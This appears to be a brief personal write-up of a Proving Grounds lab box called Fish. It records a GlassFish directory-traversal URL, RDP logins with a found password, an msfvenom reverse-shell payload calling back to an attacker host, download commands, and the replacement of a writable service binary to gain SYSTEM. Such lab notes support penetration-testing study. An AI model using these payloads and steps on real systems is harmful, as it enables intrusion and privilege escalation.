![[Pasted image 20260703191003.png]]

https://medium.com/@ryanchamruiyang/fish-proving-grounds-walkthrough-fea7bb0cf814

![[Pasted image 20260703191900.png]]


http://192.168.70.168:4848/theme/META-INF/prototype%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afwindows/win.ini

![[Pasted image 20260703191830.png]]

![[Pasted image 20260703191939.png]]

```
xfreerdp /u:arthur /p:'KingOfAtlantis' /v:192.168.70.168

xfreerdp /u:arthur /p:'KingOfAtlantis' /v:192.168.70.168 +clipboard

xfreerdp /u:arthur /p:'KingOfAtlantis' /v:192.168.70.168 +clipboard /dynamic-resolution /cert:ignore
```
![[Pasted image 20260703192049.png]]
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.49.70 LPORT=4444 -f exe -o test.exe

iwr -uri 192.168.49.70/test.exe -outfile test.exe

![[Pasted image 20260703192653.png]]
so we can write into
```
C:\\glassfish4\\glassfish\\domains\\domain1\\bin\\domain1Service.exe
```

![[Pasted image 20260703192824.png]]

![[Pasted image 20260703193013.png]]

iwr -uri 192.168.49.70/domain1Service.exe -outfile domain1Service.exe


we are NT authrity system

![[Pasted image 20260703193212.png]]
